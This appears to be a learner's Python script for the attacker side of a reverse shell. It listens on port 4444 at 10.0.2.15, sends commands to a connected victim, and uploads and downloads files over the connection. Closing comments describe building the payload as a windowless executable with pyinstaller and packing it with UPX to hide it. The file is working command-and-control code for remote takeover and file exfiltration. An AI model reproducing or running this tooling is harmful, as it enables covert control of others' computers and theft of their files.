#!/usr/bin/python
import json
import socket
import base64
class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #call method setsockoption then specify level, attribute want to modify and 1 is enable option

        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Listening on port 4444")

        self.connection, address = listener.accept()#accept method return 2 value
        print(self.connection, address)

        print("[+] got a connecction from" + str(address))
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def reliable_send(self, data):
        json_data= json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self): #unpack json data
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    def write_file(self, path ,content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+]download successful"
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input(">>  ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                print("[-] Error occured")

            print(result)
my_listener = Listener(ip="10.0.2.15",port=4444)
my_listener.run()
#/root/.wine/drive_c/program file/python
#pyinstaller.exe (filename) --onefile --noconsole

#compress exe file opt/UPX ./upx /root/pythonproject/ {filename} -o (spectify) output name {name}